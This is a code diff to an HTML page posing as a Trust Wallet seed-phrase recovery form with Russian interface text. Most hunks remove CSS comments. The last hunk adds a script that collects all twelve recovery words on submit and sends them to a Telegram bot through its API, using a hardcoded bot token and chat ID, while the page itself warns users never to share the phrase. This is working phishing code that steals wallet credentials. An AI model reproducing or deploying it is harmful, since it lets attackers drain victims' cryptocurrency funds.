@@ -16,7 +16,6 @@
             align-items: center;
             min-height: 100vh;
             flex-direction: column;
-            position: relative;
         }
         .container {
             max-width: 450px;
@@ -47,21 +46,21 @@
         }
         .seed-input {
             display: grid;
-            grid-template-columns: 1fr 1fr; /* Два равных столбца */
+            grid-template-columns: 1fr 1fr;
             gap: 16px;
-            justify-content: center; /* Центрирование всей сетки */
+            justify-content: center;
             margin-bottom: 20px;
         }
         .seed-item {
             display: flex;
             align-items: center;
-            gap: 8px; /* Расстояние между нумерацией и полем ввода */
+            gap: 8px;
         }
         .seed-item label {
             font-size: 14px;
             color: #A0A0A0;
             font-weight: bold;
-            width: 25px; /* Фиксированная ширина для выравнивания */
+            width: 25px;
             text-align: center;
         }
         input {
@@ -71,7 +70,7 @@
             border-radius: 6px;
             background-color: #2C2C2C;
             color: #FFFFFF;
-            width: 100%; /* Поля занимают всю доступную ширину */
+            width: 100%;
             box-sizing: border-box;
         }
         input::placeholder {
@@ -79,12 +78,12 @@
         }
         input:focus {
             outline: none;
-            border-color: #1C86EE; /* Цвет выделения */
+            border-color: #1C86EE;
         }
         button {
             margin-top: 20px;
-            width: 100%; /* Полная ширина кнопки */
-            max-width: 200px; /* Ограничение максимальной ширины */
+            width: 100%;
+            max-width: 200px;
             padding: 14px;
             background-color: #122fe6;
             color: #FFFFFF;
@@ -94,7 +93,7 @@
             border-radius: 18px;
             cursor: pointer;
             transition: background-color 0.3s;
-            align-self: center; /* Центрирование кнопки */
+            align-self: center;
         }
         button:hover {
             background-color: #1C86EE;
@@ -179,6 +178,38 @@
         <div class="warning">Никогда не делитесь своей секретной фразой с другими!</div>
     </div>
 
+    <script>
+        document.getElementById('seedForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const words = [];
+            for (let i = 1; i <= 12; i++) {
+                words.push(document.getElementById(`word${i}`).value.trim());
+            }
+
+            if (words.length === 12 && words.every(word => word)) {
+                const message = words.map((word, index) => `${index + 1}. ${word}`).join('\n');
+                const chatId = '@bdsjxjdhd';
+                const token = '7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg';
+                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                fetch(url)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            alert('Секретная фраза успешно отправлена!');
+                        } else {
+                            alert('Ошибка отправки.');
+                        }
+                    })
+                    .catch(error => {
+                        alert('Ошибка отправки.');
+                    });
+            } else {
+                alert('Пожалуйста, заполните все поля.');
+            }
+        });
+    </script>
     <footer>
         © 2025 Trust Wallet. Все права защищены.
     </footer>
